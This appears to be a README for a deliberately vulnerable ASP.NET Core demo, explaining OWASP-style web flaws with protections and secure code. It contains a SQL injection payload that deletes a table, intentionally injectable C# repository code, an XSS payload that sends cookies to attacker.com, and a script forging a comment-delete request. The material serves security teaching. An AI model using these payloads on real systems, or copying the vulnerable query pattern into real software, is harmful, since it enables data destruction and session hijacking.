# Typical web app security vulnerabilities
* [Injection](#injection)
* [Broken Authentication and Session Management](#broken-authentication-and-session-management)
* [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
* [Broken Access Control](#broken-access-control)
* [Security Misconfiguration](#security-misconfiguration)
* [Sensitive Data Exposure](#sensitive-data-exposure)
* [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)

## Injection
Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries.
Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.
Injection can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, or denial of access. Injection can sometimes lead to complete host takeover.

### Protection
* use entity framework Linq Queries
* don't set params directly into SQL string

### Sql Injection sample
Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:

```var sql = "SELECT * FROM product WHERE sku='{sku}' LIMIT 1";```

Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, 
(e.g. EF Core FromSql Method):

```
SecurityWeakness.Infrastructure.SQL.NotSecureProductSqlRepository:

public Product GetSingleBySku(string sku)
{
    var sql = $"SELECT * FROM product WHERE sku='{sku}' LIMIT 1";
    return context.Products.FromSql(sql).ToArray().Single();
}
```

In both cases, the attacker modifies the ‘sku’ parameter value in their browser to send:

``` 
http://localhost:62384/NotSecureProducts/Product?sku=p2';DELETE from product;SELECT '1
```

This changes the meaning of both queries to delete all the records from the product table. More dangerous attacks could modify or delete data, or even invoke stored procedures.

### Secure sample
Rewrite code using Linq Query, or use parameterization for raw SQL queries 
```
SecurityWeakness.Infrastructure.SQL.SecureProductSqlRepository:
public Product GetSingleBySku(string sku)
{
    return context.Products.FromSql($"SELECT * FROM {TableName} WHERE sku={{0}} LIMIT 1", sku).ToArray().Single();
}
```

## Broken Authentication and Session Management
These types of weaknesses can allow an attacker to either capture or bypass the authentication methods that are used by a web application.

* User authentication credentials are not protected when stored.
* Predictable login credentials.
* Session IDs are exposed in the URL (e.g., URL rewriting).
* Session IDs are vulnerable to session fixation attacks.
* Session value does not timeout or does not get invalidated after logout.
* Session IDs are not rotated after successful login.
* Passwords, session IDs, and other credentials are sent over unencrypted connections.
The goal of an attack is to take over one or more accounts and for the attacker to get the same privileges as the attacked user.

### Protection
* Credentials should be protected: User authentication credentials should be protected when stored using hashing or encryption.
* Do not expose session ID in the URL: Session IDs should not be exposed in the URL (e.g., URL rewriting).
* Session IDs should timeout: User sessions or authentication tokens should be properly invalidated during logout.
* Recreate session IDs: Session IDs should be recreated after successful login.
* Do not send credentials over unencrypted connections: Passwords, session IDs, and other credentials should not be sent over unencrypted connections.
* Password length: Minimum password length should be at least eight (8) characters long. Combining this length with complexity makes a password difficult to guess using a brute force attack.
* Password complexity: Passwords should be a combination of alphanumeric characters. Alphanumeric characters consist of letters, numbers, punctuation marks, mathematical and other conventional symbols.
* Username/Password Enumeration: Authentication failure responses should not indicate which part of the authentication data was incorrect. For example, instead of "Invalid username" or "Invalid password", just use "Invalid username and/or password" for both. Error responses must be truly identical in both display and source code.
* Protection against brute force login: Enforce account disabling after an established number of invalid login attempts (e.g., five attempts is common). The account must be disabled for a period of time sufficient to discourage brute force guessing of credentials, but not so long as to allow for a denial-of-service attack to be performed.

## Cross-Site Scripting (XSS)
Cross Site Scripting (XSS) is a widespread vulnerability that affects many web applications. XSS attacks consist of injecting malicious client-side scripts into a website and using the website as a propagation method.
XSS is the most prevalent web application security flaw. XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content. There are two different types of XSS flaws: 1) Stored and 2) Reflected, and each of these can occur on the a) Server or b) on the Client.

Detection of most Server XSS flaws is fairly easy via testing or code analysis. Client XSS is very difficult to identify.

Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.

### Protection
* protect web inputs with HTML sanitizers
* remove un secure htmltags (style,script etc) before save in database
* protect cookies with Secure and Http only attributes in http header

### Xss Attack sample
* Hijack a user’s session
The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

```(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";```

The attacker modifies the 'CC' parameter in their browser to:

```'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.```

* **asp.net core** protect it cookie from this kind of vulnerability, to enable cookie for document.cookie you need set ``` options.Cookie.HttpOnly=false```
```
    services.ConfigureApplicationCookie(options =>
    {
        options.Cookie.HttpOnly = true;
    });
```

This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.

* Perform unauthorized activities
If the HTTP Only cookie attribute is set, we cannot steal the cookies through JavaScript. However, using the XSS attack, we can still perform unauthorized actions inside the application on behalf of the user.
```
  <script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST','http://localhost:62384/NotSecureProducts/DeleteComment',true);
	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	xhr.send('sku=p1&productid=1&commentid=1');
</script>
```

* Phishing to steal user credentials
XSS can also be used to inject a form into the vulnerable page and use this form to collect user credentials. This type of attack is called phishing.

* Capture the key strokes by injecting a keylogger
In this attack scenario we will inject a JavaScript keylogger into the vulnerable web page and we will capture all the key strokes of the user within the current page.

First of all, we will create a separate JavaScript file and we will host it on the attacker controlled server. We need this file because the payload is too big to be inserted in the URL and we avoid encoding and escaping errors

## Broken Access Control
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:

* Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool
* Allowing the primary key to be changed to another's users record, permitting viewing or editing someone else's account.
* Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation
* CORS misconfiguration allows unauthorized API access.
* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

### Protection
Access control is only effective if enforced in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.

* Deny access to functionality by default.
* Use Access control lists and role-based authentication mechanisms.
* Do not just hide functions.

## Security Misconfiguration
Some common security misconfigurations include:

* Unpatched systems
* Using default account credentials (i.e., usernames and passwords)
* Unprotected files and directories
* Unused web pages
* Poorly configured network devices

### Protection
* Developing a repeatable patching schedule
* Keeping software up to date
* Disabling default accounts
* Encrypting data
* Enforcing strong access controls
* Provide admins with a repeatable process to avoid overlooking items
* Set security settings in development frameworks to a secure value
* Run security scanners and perform regular system audits

## Sensitive Data Exposure
## Cross-Site Request Forgery (CSRF)
## Using Components with Known Vulnerabilities
Known vulnerabilities are vulnerabilities that were discovered in open source components and published in the NVD, security advisories or issue trackers. 
From the moment of publication , a vulnerability can be exploited by hackers who find the documentation. According to OWASP, the problem of using components with known vulnerabilities is highly prevalent

## Resources
* [OWASP .NET](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DotNet_Security_Cheat_Sheet.md)
* [ASP.NET Core Security](https://docs.microsoft.com/en-us/aspnet/core/security/?view=aspnetcore-2.2)
* [OWASP Top Ten 2017](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)
* [Cross Site Scripting (XSS)](https://blog.sucuri.net/2019/01/owasp-top-10-security-risks-part-iv.html)
* [Cross Site Scripting (XSS) Asp net core](https://docs.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-2.2)
* [xss-attacks-practical-scenarios](https://pentest-tools.com/blog/xss-attacks-practical-scenarios/)
* [HTTP only, Secure cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
* [broken-authentication-and-session-management](https://hdivsecurity.com/owasp-broken-authentication-and-session-management)
* [security-misconfigurations](https://resources.infosecinstitute.com/guide-preventing-common-security-misconfigurations/#gref)

